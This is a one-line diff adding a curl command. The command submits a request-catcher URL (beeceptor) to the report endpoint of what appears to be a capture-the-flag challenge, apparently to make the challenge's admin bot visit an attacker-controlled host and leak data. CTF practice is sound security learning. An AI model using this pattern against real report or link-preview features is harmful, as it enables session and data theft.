@@ -1,0 +1,1 @@
+curl https://note.ctf.zoolab.org/report -d 'url=https://yungping.free.beeceptor.com'
